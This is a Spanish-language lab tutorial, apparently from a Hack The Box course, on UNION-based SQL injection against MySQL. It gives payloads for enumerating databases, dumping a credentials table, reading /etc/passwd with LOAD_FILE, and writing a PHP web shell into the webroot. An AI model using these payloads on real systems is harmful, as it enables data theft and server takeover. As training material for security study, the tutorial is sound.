# ENUMERACION DE BASE DE DATOS #

<br>

En las secciones anteriores, aprendimo sobre diferentes consultas SQL en MySQL e inyecciones de SQL y como usarlas. Esta seccion pondra en uso todo la aprendido con el objetvo de recopilar datos usando consultas SQL dentro de inyecciones SQL.

<br>

## FOOTPRINTING DE MYSQL ##

<br>

Antes de enumerar la base de datos, generalmente necesitamos identificar el tipo de DBMS con el que estamos tratando. Esto se debe a que cada DBMS tiene consultas diferentes, sabiendo a que DBMS nos enfrentamos nos ayudara a saber que consultas usar.

Como suposicion inicial, si el servidor web que vemos en la respuesta HTTP es Apache o Nginx, es una buena suposicion de que el servidor web que se esta ejecutando en Linux, por lo que es probable que el DBMS sea MYSQL. Lo mismo aplica a Microsoft DBMS si el servidor web es un IIS, por lo que probablemente sea MSSQL. Sin embargo, esta es una suposicion descabellada ya que muchas otras bases de datos se pueden usar para el sistema operativo o el servidor web. Entonces, hay diferentes consultas que podemos probar para identificar el tipo de base con la que estamos tratando.

Mientras cubrimos MYSQL vamos a ver su huella digital. Las siguientes consultas y salidas nos diran que estamos tratando con MYSQL.

<br>

    *---------------------------------------------------------------------------------------------------------------------------------------------------------------------*
    | PAYLOAD   	    | CUANDO USAR 	                                  | RENDIMIENTO ESPERADO 	                                  | SALIDA INCORRECTA                 |
    *-------------------*-------------------------------------------------*-----------------------------------------------------------------------------------------------* | SELECT@@version   | Cuando tenemos la salida de consulta completa   | Versión de MySQL 'es decir 10.3.22-MariaDB-1ubuntu1'      | Error en otros DBMS.              |
    *-------------------*-------------------------------------------------*-----------------------------------------------------------*-----------------------------------*
    | SELECT POW(1,1)   | Cuando solo tenemos salida numerica             | 1                                                         | Error con otros DBMS              |
    *-------------------*-------------------------------------------------*-----------------------------------------------------------*-----------------------------------*
    | SELECT SLEEP(5)   | Ciego / Sin Salida                              | Retrasa la respuesta de la pagina por 5 segundos          | No retrasa la salida en otro DBMS |
    *-------------------*-------------------------------------------------*-----------------------------------------------------------*-----------------------------------*

<br>

Como vimos en el ejemplo de la seccion anterior, cuando intentamos "@@version" nos dio:

<br>

![](https://academy.hackthebox.com/storage/modules/33/db_version_1.jpg)

<br>

La salida "10.3.22-MariaDB-1ubuntu1" significa que estamos ante un MariaDB muy similar a MySQL. Dado que tenemos una salida de consulta directa, no tendremos que probar mas cargas utiles, basta con comenzar a consultar.

<br>

## USO DE INFORMATION_SCHEMA ##

<br>

Para extraer datos de las tablas usando UNION SELECT, primero tenemos que seguir un proceso de enumeracion que consiste en obtener la siguiente informacion:

<br>

*   Lista de Bases de Datos

*   Lista de Tablas dentro de cada Base de Datos

*   Lista de Columnas dentro de cada Tabla

<br>

Con la informacion anterior, podemos formar nuestros SELECT para volvar los datos. Aqui es donde vamos a utilizar la base de datos de INFORMATION_SCHEMA.

La base de datos de INFORMATION_SCHEMA contiene metadatos sobre las bases de datos y las tablas presentes en el servidor. Esta base de datos juega un papel crucial a la hora de explotar inyecciones de SQL.

Para hacer referencia a una tabla presente en otras bases de datos podemos usar el operador ".", por ejemplo:

<br>

    SELECT * FROM my_database.users;

<br>

## ENUMERACION DE ESQUEMA ##

<br>

Para comenzar nuestra enumeracion, debemos encontrar que bases de datos estan disponibles en el DBMS. La tabla SCHEMATA en la base de datos de INFORMATION_SCHEMA contiene informacion sobre todas las bases de datos del servidor, lo vamos a utilizar para obtener los nombres de las bases de datos para poder consultarlas. La columna de SCHEMA_NAME contiene todos los nombres de las bases de datos actualmente presentes.

<br>

    mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

    +--------------------+
    | SCHEMA_NAME        |
    +--------------------+
    | mysql              |
    | information_schema |
    | performance_schema |
    | ilfreight          |
    | dev                |
    +--------------------+
    6 rows in set (0.01 sec)

<br>

Veamos la base de datos "ilfreight" y "dev".

<br>

    NOTA: Las 3 primeras bases de datos son predeterminadas de MYSQL y estan siempre presentes en cualquier servidor, por lo que generalmente las ignoramos durante la enumeracion de la base de datos. A veces tambien hay una cuarta base de datos llamada "sys".

<br>

Ahora, hagamos lo mismo usando una inyeccion SQL de UNION en el ejemplo con el siguiente payload:

<br>

    cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

<br>

![](https://academy.hackthebox.com/storage/modules/33/ports_dbs.png)

<br>

Una vez mas, vemos dos bases de datos, ilfreight y dev, aparte de las predeterminadas. Veamos que base de datos esta utilizando la aplicacion web para recuperar los datos en la tabla. Podemos encontrar la base de datos en uso utilizando "SELECT database()". Podemos hacer esto de manera similar a como encontramos la version del DBMS en la seccion anterior.

<br>

    cn' UNION select 1,database(),2,3-- -

<br>

![](https://academy.hackthebox.com/storage/modules/33/db_name.jpg)

<br>

Veamos que el nombre de la base de datos en uso es ilfreight, Sin embarg parece que en la otra base de datos (dev) tambien hay informacion importante, intentemos recuperar las tablas de el.

<br>

## ENUMERACION DE TABLAS ##

<br>

Antes de obtener los datos de la base de datos dev, necesitamos obtener una lista de las tablas para consultarlas con un SELECT. Para encontrar todas las tablas dentro de una base datos, podemos usar la metadata de INFORMATION_SCHEMA con la instruccion de TABLES.

La instruccion de TABLES contiene informacion sobre todas las tablas de la base de datos. Esta tabla contiene varias columnas pero a nosotros nos debe interesar las columnas de TABLE_SCHEMA y TABLE_NAME. TABLE_NAME almacena los nombres de las tablas, mientras que TABLE_SCHEMA apunta a que base de datos pertenece cada tabla. Esto se puede hacer de manera muy similar a como encontramos los nombres de la base de datos. Por ejemplo. podemos usar el siguiente payload para encontrar las tablas dentro de la base de datos dev:

<br>

    cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -

<br>

    Observa como reemplazamos los numeros "2" y "3" con "TABLE_NAME" y "TABLE_SCHEMA", para obtener el resultado de ambas columnas en la misma consulta.

<br>

![](https://academy.hackthebox.com/storage/modules/33/ports_tables_1.jpg)

<br>

    NOTA: Agregamos una condicion (WHERE table_schema='dev') para devolver unicamente las tablas de la base de datos "dev"; de lo contrario, obtendriamos todas las tablas de todas las bases de datos que podrian ser muchisimas (y causar errores).

<br>

Vemos cuatro tablas en la base de datos de dev, que son credentials, framework, pages y posts. Por ejemplo, puede que la tabla de credentials tenga informacion confidencial para examinar.

<br>

## COLUMNAS ##

<br>

Para volcar los datos de los credentials primero tenemos que encontrar los nombres de las columnas de la tabla que podemos encontrar en la tabla COLUMNS de la base de datos INFORMATION_SCHEMA. La tabla COLUMNS contiene infromacion sobre todas las consultas presentes en todas las bases de datos. Esto nos ayuda a encontrar los nombres de columna para consultar una tabla. LosC COLUMN_NAME y TABLE_SCHEMA nos pueden ayudar a lograr esto. Como hicimos antes, probemos este payload para encontrar los nombres de las columnas de la tabla credentials.

<br>

    cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -

<br>

![](https://academy.hackthebox.com/storage/modules/33/ports_columns_1.jpg)

<br>

La tabla tiene dos columnas llamadas username y password. Podemos usar esta informacion y volcar los datos de la tabla.

<br>

## DATOS ##

<br>

Ahora que tenemos toda la infromacion, podemos formar una consulta de UNION para volcar todos los datos de las columnas username y password de las columnas de la tabla credentials en la base de datos dev. Podemos colocar username y password en lugar de las columnas 2 y 3.

<br>

    cn' UNION select 1, username, password, 4 from dev.credentials-- -

<br>

    RECORDATORIO: No olvides usar el operador de punto para referirte a la tabla de "credentials" en la base de datos "dev", ya que estamos ejecutando la base de datos "ilfreight" como mencionamos anteriormente.

<br>

![](https://academy.hackthebox.com/storage/modules/33/ports_credentials_1.png)

<br>

Pudimos obtener todas las entradas en la tabla credentials que contiene informacion confidencial como el hash de las contraseñas y una clave API.

<br>

# LECTURA DE ARCHIVOS #

<br>

Ademas de recopilar datos de varias tablas y bases de datos dentro del DBMS, una inyeccion SQL tambien se puede aprovechar para realizar muchas otras operaciones, como leer y escribir rchivos en el servidor e incluso obtener la ejecucion remota de codigo en el back-end.

<br>

## PRIVILEGIOS ##

<br>

La lectura de datos es mucho mas comun que la escritura de datos, que esta estrictamente reservada para usuarios privilegiados en los DBMS modernos, ya que puede conducir a le explotacion de un sistema como veremos. Por ejemplo, en MySQL, el usuario de la base de datos debe tener el privilegio FILE para cargar el contenido de un archivo en una tabla y luego volcar datos de esa tabla y leer archivos. Entonces, comencemos recopilando los datos sobre nuestros privilegios de usuario dentro de la base de datos para decidir si leeremos y/o escribiremos archivos en el servidor back-end.

<br>

## USUARIO DE BASE DE DATOS ##

<br>

Primero tenemos que determinar que usuario somos dentro de la base de datos. Si bien no necesitamos necesariamente privilegios de administrador de base de datos (DBA) para leer datos, esto es cada vez mas necesario en los DBMS modernos, ya que solo los DBA tienen dichos privilegios. Lo mismo se aplica a otras bases de datos comunes. Si tenemos privilegios de DBA, entonces es muy probable que tengamos privilegio de lectura de archivos. Si no lo hacemos, tenemos que comprobar nuestros privilegios para ver que podemos hacer. Para poder encontrar nuestro usuario en la base de datos actual, podemos usar cualquiera de las siguientes consultas.

<br>

    SELECT USER()
    SELECT CURRENT_USER()
    SELECT user from mysql.user

<br>

Nuestro payload de UNION seria el siguiente:

<br>

    cn' UNION SELECT 1, user(), 3, 4-- -

<br>

o:

<br>

    cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -

<br>

Recibimos en la salida que nuestro usuario actual es "root".

<br>

![](https://academy.hackthebox.com/storage/modules/33/db_user.jpg)

<br>

Esto es muy prometedor, ya que es probable que un usuario root sea un DBA, lo que nos dara muchos privilegios.

<br>

## PRIVILEGIOS DE USUARIO ##

<br>

Ahora, que conocemos a nuestro usuario, podemos comenzar a buscar que privilegios tenemos con ese usuario. En primer lugar, podemos probar si tenemos privilegios de superadministrador con la siguiente conuslta.

<br>

    SELECT super_priv FROM mysql.user

<br>

Una vez mas, podemos usar el siguiente payload con la consulta anterior.

<br>

    cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -

<br>

Si tuvieramos muchos usuarios dentro del DBMS, podemos agregar WHERE user = "root"-- -

<br>

![](https://academy.hackthebox.com/storage/modules/33/root_privs.jpg)

<br>

La consulta nos devuelve Y, lo que significa que YES, tenemos privilegios de superusuario. Tambien podemos volcar otros privilegios que tengamos directamente en el esquema con la siguiente consulta:

<br>

    cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -

<br>

Una vez mas, podemos agregar "WHERE user='root'-- -" para mostrar solo nuestro usuario actual root. Nuestro payload seria:

<br>

    cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE user="root"-- -

<br>

Y vemos todos los posibles privilegios otorgados a nuestro usuario actual.

<br>

![](https://academy.hackthebox.com/storage/modules/33/root_privs_2.jpg)

<br>

Vemos que el privilegio de FILE se enumera para nuestro usuario lo que nos permite leer archivos y potencialmente incluso escribir archivos. Por lo tanto, procedamos a intentar leer los archivos.

<br>

## CARGAR ARCHIVOS ##

<br>

Ahora que sabemos que tenemos suficientes privilegios para leer los archivos del sistema local, hagamoslo usando la funcion de "LOAD_FILE()" que esta en MariaDB/MYSQL para leer datos de archivos. La funcion toma solo un argumento, que es el nombre de usuario. La siguiente consulta es un ejemplo de como leer el archivo '/etc/passwd'.

<br>

    SELECT LOAD_FILE('/etc/passwd');

<br>

    NOTA: Solo podremos leer el archivo si el usuario del sistema operativo que ejecuta MYSQL tiene suficientes privilegios para leerlo.

<br>

Similar a como hemos estado usando la inyeccion de UNION podemos usar la consulta anterior.

<br>

    cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -

<br>

![](https://academy.hackthebox.com/storage/modules/33/load_file_sqli.png)

<br>

Pudimos leer con exito el contenido del archivo passwd a traves de la inyeccion SQL. Desafortunadamente, esto tambien se puede usar para filtrar el codigo fuente de la pagina.

<br>

## OTRO EJEMPLO ##

<br>

Sabemos que la pagina actual es search.php. La webroot predeterminada de apache es /var/www/html. Intentemos leer el codigo fuente del archivo en /var/www/html/search.php

<br>

    cn' UNION SELECT 1, LOAD_FILE("/var/www/htmlsearch.php"), 3, 4 -- -

<br>

![](https://academy.hackthebox.com/storage/modules/33/load_file_search.png)

<br>

Sin embargo, la pagina termina mostrando el codigo HTML dentro del navegador, podemos verlo usando [CTRL + U].

<br>

![](https://academy.hackthebox.com/storage/modules/33/load_file_source.png)

<br>

El codigo fuente nos muestra el codigo PHP completo, que podriamos inspeccionar mas a fondo para encontrar informacion confidencial, como credenciales de conexion a la base de datos o alguna que otra vulnerabilidad.

<br>

# ESCRITURA DE ARCHIVOS #

<br>

Cuando se trata de escritua de archivos en el servidor back-end, se vuelve mucho mas restringido en los DBMS modernos, ya que podemos utilizar esto para escribir una web shell en el servidor remoto, con lo que obtendriamos la ejecucion del codigo y podriamos hacernos cargo del servidor. Esta es la razon por la que los DBMS modernos deshabilitan la escritura de archivos de forma predeterminada, donde requieren de ciertos privilegios para que los DBA escriban archivos. Antes de comenzar a escribir archivos primero debemos ver si tenemos los permisos correspondientes.

<br>

## PRIVILEGIOS DE ESCRITURA DE ARCHIVOS ##

<br>

Para poder escribir archivos en el back-end usando una base de datos MYSQL necesitamos tres cosas:

*   Usuario con el privilegio FILE habilitado.

*   Variable mysql global secure_file_priv no habilitada.

*   Acceso de escritura a la ubicacion en la que quisiesemos escribir en el servidor back-end.

<br>

Ya hemos encontrado que nuestro usuario tiene los privilegios de FILE necesarios para escribir archivos, pero ahora debemos ver si la base de datos tiene ese privilegio con la variable de secure_file_priv.

<br>

## SECURE_FILE_PRIV ##

<br>

La variable de secure_file_priv se usa para determinar donde podemos leer/escribir archivos. Un valor vacio nos permitiria leer archivos de todo el sistema. De lo contraro, si estuvisese en un determinado directorio solo podriamos escribir en esa ruta. Por otra parte un NULL nos dice que no podemos leer/escribir desde ningun directorio. MariaDB nos permite escribir en cualquier lugar de manera predeterminada, pero MYSQL no, ya que usa como carpeta predeterminada /var/lib/mysql-files.

Entonces, veamos como podemos averiguar el valor de secure_file_priv. Dentro de MySQL, podemos usar la siguiente consulta para ver el valor de la variable.

<br>

    SHOW VARIABLES LIKE 'secure_file_priv';

<br>

Sin embargo, como estamos usando una inyeccion de UNION, tenemos que obtener el valor con un SELECT. esto no deberia ser un problema, ya que todas las variables y la gran mayoria de configuraciones se almacenan dentro del INFORMATION_SCHEMA. En MYSQL las variables globales se almacenan en una tabla llamada global_variables y, segun la documentacion, tiene dos columnas variable_name y variable_value.

<br>

Tenemos que seleccionar estas dos columnas de esa tabla en la base de datos de INFORMATION_SCHEMA. Hay cientos de variables globales en una configuracion de MYSQL y no queremos recuperarlas todas, asi qeu filtraremos con ayuda de un WHERE para mostrar solo la variable de secure_file_priv.

<br>

    SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"

<br>

Entonces, al igual que otras consultas de UNION, podemos obtener el resultado de la consulta con un payload.

<br>

    cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -

<br>

![](https://academy.hackthebox.com/storage/modules/33/secure_file_priv.jpg)

<br>

Y el resultado muestra que secure_file_priv esta vacio por lo que podemos leer/escribir archivos en cualquier ubicacion.

<br>

## ESCRIBIENDO ARCHIVOS ##

<br>

Ahora que hemos confirmado que nuestro usuario puede escribir en el servidor back-end, intentemos usar la declaracion SELECT .. INTO OUTFILE. La declaracion SELECT INTO OUTFILE se puede usar para escribir datos de consultas seleccionadas en archivos. Esto generalmente lo vamos a usar para exportar datos de tablas.

Para usarlo, podemos agregar INTO OUTFILE '...' despues de nuestra consulta para exportar los resultados al archivo que especificamos. El siguiente ejemplo guarda la salida de la tabla users en la carpeta /tmp/credentials.

<br>

    SELECT * from users INTO OUTFILE '/tmp/credentials';

<br>

Si vamos al servidor back-end y cateamos el archivo, vemos el contenido de esa tabla.

<br>

    xJplz@htb[/htb]$ cat /tmp/credentials

    1       admin   392037dbba51f692776d6cefb6dd546d
    2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f

<br>

Tambien es posible directamente añadir al SELECT cadenas de archivos lo que nos permite escribir archivos arbitrarios en el servidor back-end.

<br>

    SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';

<br>

Cuando nosotros cateamos el archivo, vemos el texto.

<br>

    xJplz@htb[/htb]$ cat /tmp/test.txt

    this is a test

<br>

    Jaiderpls@htb[/htb]$ ls -la /tmp/test.txt

    -rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt

<br>

Como podemos ver arriba, el archivo test.txt se creo con exito y es propiedad del usuario MySQL.

    SUGERENCIA: Las exporrtanciones de archivo avanzadas utilizan la funcion 'FROM_BASE64("base64_data")'  para poder escribir archivos largos/avanzados, incluidos datos binarios.

<br>

## ESCRITURA DE ARCHIVOS A TRAVES DE INYECCIONES SQL ##

<br>

Intentemos escribir un archivo de texto en webroot y verifiquemos si tenemos permisos de escritura. La siguiente consulta debe indicarnos "file written succesfully!" hacia /var/www/html/proof.txt

<br>

    select 'file written successfully!' into outfile '/var/www/html/proof.txt'

<br>

    NOTA: Para escribir un webshell, debemos conocer primero el drectorio base del servidor web (es decir, la raiz web). Una forma de encontrarlo es usando "load_file" para leer la configuracion del servidor que por lo general en Apache se encuentra en /etc/apache2/apache2.conf, y en NGINX en /etc/nginx/nginx.conf, o en configuraciones de IIS en %WinDir%\System32\Inetsrv\Config\ApplicationHost.config, o podemos buscar en internet otras posibles rutas de configuraciones. Ademas podemos realiar un escaneo fuzzing e intentar escribir archivos en diferentes raices web posibles usando diccionarios. Finalmente, si nada de lo anterior funciona podemos usar los errores del servidor que se nos muestra e intentar encontrar el directorio web de esa manera.

<br>

El payload del UNION seria de la siguiente manera.

<br>

    cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -

<br>

![](https://academy.hackthebox.com/storage/modules/33/write_proof.png)

<br>

No vemos ningun error en la pagina, lo que indica que la consulta se realizo correctamente. Comprobando el archivo proof.txr en el webroot, vemos que efectivamente existe:

<br>

![](https://academy.hackthebox.com/storage/modules/33/write_proof_text.png)

<br>

NOTA: Vemos la caena que descartamos junto con '1', '3' y '4'. Esto se debe a que todo el resultado de la consulta UNION se escribiro en el archivo, para una salida pas limpia podemos usar "" en lugar de numeros.

<br>

## ESCRIBIENDO UNA WEBSHELL ##

<br>

Habiendo confirmado que tenemos permisos de escritura, podemos continuar y escribir un web shell de PHP en la carpeta webroot. Podemos escribir el siguiente webshell PHP para poder ejecutar comandos directamente en el servidor back-end.

<br>

    <?php system($_REQUEST[0]); ?>

<br>

Podemos reutilizar nuestro anterioe UNION y cambiar la cadena del anterior con el nombre de archivo de shell.php

<br>

    cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -

<br>

![](https://academy.hackthebox.com/storage/modules/33/write_shell.png)

<br>

Una vez mas, no vemos ningun error, lo que significa que la escritura de archivos posiblemente funciono. Esto se puede verificar navegando a la ruta /shell.php y ejecutar comandos a traves del parametro 0, con "?0=id" en nuestra URL.

<br>

![](https://academy.hackthebox.com/storage/modules/33/write_shell_exec_1.png)

<br>

La salida del comandi id nos confirma que tenemos ejecucion de codigo y lo estamos usando como el usuario www-data.